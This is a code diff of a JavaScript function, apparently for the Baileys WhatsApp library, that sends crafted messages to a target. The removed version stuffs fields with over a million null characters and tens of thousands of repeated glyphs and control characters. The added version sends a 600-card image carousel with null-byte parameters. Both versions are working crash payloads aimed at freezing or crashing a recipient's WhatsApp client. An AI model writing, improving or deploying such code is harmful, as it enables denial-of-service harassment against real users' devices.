@@ -1,35 +1,43 @@
-async function DelayMakluAnjg(sock, target) {
-  await sock.relayMessage(target, {
+async function crl(sock, target) {
+  const imageMessage = {
+                    url: "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
+                    mimetype: "image/jpeg",
+                    fileSha256: "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
+                    fileLength: "10840",
+                    height: 10,
+                    width: 10,
+                    mediaKey: "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
+                    fileEncSha256: "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
+                    directPath: "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0",
+                    mediaKeyTimestamp: "1721344123",
+                    jpegThumbnail: ""
+  }
+
+  let cards = [];
+  for (let z = 0; z < 600; z++) {
+    cards.push({
+      header: {
+        imageMessage,
+        hasMediaAttachment: true
+      },
+      nativeFlowMessage: {
+        messageParamsJson: "\0"
+      }
+    })
+  }
+  let msg = generateWAMessageFromContent(target, {
     groupStatusMessageV2: {
       message: {
-        interactiveResponseMessage: {
-          body: {
-            text: "YatimXxXcrotX",
-            format: "DEFAULT"
-          },
-          nativeFlowResponseMessage: {
-            name: "address_message",
-            paramsJson: {"values":{"in_pin_code":"xxx","building_name":"xxx","landmark_area":"X","address":"xxx","tower_number":"maklo","city":"porno","name":"crb","phone_number":"xxx","house_number":"xxx","floor_number":"xxx","state":"yandex | ${"\u0000".repeat(1645000)}"}},
-            version: 3
-          },
-          contextInfo: {
-            quotedMessage: {
-              viewOnceMessage: {
-                message: {
-                  interactiveResponseMessage: {
-                    body: {
-                      text: "⏤͟͟͞͞𝗞𝗶𝗺𝗶𝗫𝗫𝟳 ⩇⩇:⩇⩇" + "ꦾ".repeat(50000) + "ꦽ".repeat(50000),
-                      format: "DEFAULT" 
-                    },
-                    nativeFlowResponseMessage: {
-                      name: "call_permission_request",
-                      paramsJson: "\u0007".repeat(90000),
-                      version: 3
-              }
-            }
+        interactiveMessage: {
+          body: { text: "\0" },
+          carouselMessage: {
+            cards
           }
         }
       }
     }
-  }, { participant: { jid: target }});
+  }, {});
+  await sock.relayMessage(target, msg.message, {
+    participant: { jid:target }
+  });
 }
